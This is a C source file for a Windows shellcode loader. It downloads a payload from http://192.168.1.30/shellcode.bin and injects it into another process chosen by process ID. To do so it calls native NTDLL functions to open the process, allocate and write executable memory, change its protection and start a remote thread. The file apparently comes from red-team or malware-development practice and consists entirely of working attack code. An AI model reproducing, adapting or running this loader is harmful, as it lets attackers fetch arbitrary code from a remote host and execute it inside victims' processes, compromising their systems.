#include "header.h"

unsigned char code[276];

BOOL fetch() {
	HANDLE hInet = NULL;
	HANDLE hInternetFile = NULL;
	PBYTE bytes_read;

	hInet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);

	if (hInet == NULL) {
		printf("Failure Connecting\tCode: 0x%ld", GetLastError());
		return FALSE;
	}
	hInternetFile = InternetOpenUrlW(hInet, L"http://192.168.1.30/shellcode.bin", NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);

	if (hInternetFile == NULL) {
		printf("Interfile Error\tCode: 0x%ld", GetLastError());
		return FALSE;
	}
	InternetReadFile(hInternetFile, code, 276, &bytes_read);
	printf("Read %ld Bytes From Site\n", bytes_read);

	InternetCloseHandle(hInet);
	return TRUE;
}

BOOL statusCheck(NTSTATUS status, const char* String) {
	if (status != STATUS_SUCCESS) {
		bad("Failed %s\tCode: 0x%X", String, status);
		return FALSE;
	}
	else {
		return TRUE;
	}
}


int main(int argc, char* argv[]) {
	HANDLE   hProc     = NULL;
	HANDLE   hThread   = NULL;
	HMODULE  hNTDLL    = NULL;
	NTSTATUS status    = NULL;
	PVOID    rBuffer   = NULL;
	DWORD    bytes_ret = NULL;
	DWORD    tID       =    0;
	DWORD    pID       =    0;

	pID = atoi(argv[1]);
	

	OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
	CLIENT_ID CID        = { (HANDLE)pID, NULL };
	
	if (!fetch()) {
		return EXIT_FAILURE;
	}

	size_t code_len = sizeof(code);

	info("Loading DLLs And Function Address...");
	hNTDLL = GetModuleHandleW(L"NTDLL");
	printf("[Ntdll.dll]\n\\____0x%p\n\n", hNTDLL);

	_func_NtOpenProcess pOpenProc = (_func_NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
	printf("[NtOpenProcess]\n\\____0x%p\n", pOpenProc);

	_func_NtAllocateVirtualMemory pAllocMemory = (_func_NtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
	printf("[NtAllocateVirtualMemory]\n\\_____0x%p\n", pAllocMemory);

	_func_NtWriteVirtualMemory pWriteMemory = (_func_NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
	printf("[NtWriteVirtualMemory]\n\\______0x%p\n", pWriteMemory);

	_func_NtCreateThreadEx pStartThread = (_func_NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
	printf("[NtCreateThreadEx]\n\\_______0x%p\n", pStartThread);

	NtProtectVirtualMemory pVirtualProtect = (NtProtectVirtualMemory)GetProcAddress(hNTDLL, "NtProtectVirtualMemory");
	printf("[NtProtectVirtualMemory]\n\\________0x%p\n", pVirtualProtect);

	_func_NtWaitForSingleObject pWait = (_func_NtWaitForSingleObject)GetProcAddress(hNTDLL, "NtWaitForSingleObject");
	printf("[NtWaitForSingleObject]\n\\_________0x%p\n", pWait);

	status = pOpenProc(&hProc, PROCESS_ALL_ACCESS, &OA, &CID);
	if (!statusCheck(status, "pOpenProc")) {
		return EXIT_FAILURE;
	}
	good("Got Handle To Process [%ld]\n\\____0x%p\n", pID, hProc);

	status = pAllocMemory(hProc, &rBuffer, 0, &code_len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	if (!statusCheck(status, "pAllocMem")) {
		return EXIT_FAILURE;
	}
	good("Allocated a Buffer Of %ld-Bytes [RW-]\n", sizeof(code));

	status = pWriteMemory(hProc, rBuffer, code, code_len, &bytes_ret);
	if (!statusCheck(status, "pWriteMem")) {
		return EXIT_FAILURE;
	}
	good("Wrote %ld-Bytes Into Memory\n", bytes_ret);

	DWORD oldProc;
	status = pVirtualProtect(hProc, &rBuffer, &code_len, PAGE_EXECUTE_READ, &oldProc);
	if (!statusCheck(status, "pVirtualProtect")) {
		return EXIT_FAILURE;
	}
	info("Changed Perms [R-X]\n");

	info("Press <ENTER> To Start Thread...");
	getchar();
	status = pStartThread(&hThread, THREAD_ALL_ACCESS, &OA, hProc, (PTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, 0, 0, NULL);
	

	pWait(hThread, FALSE, NULL);
	good("Thread Finished, Cleaning Up...");

	CloseHandle(hProc);
	CloseHandle(hThread);

	return EXIT_SUCCESS;
}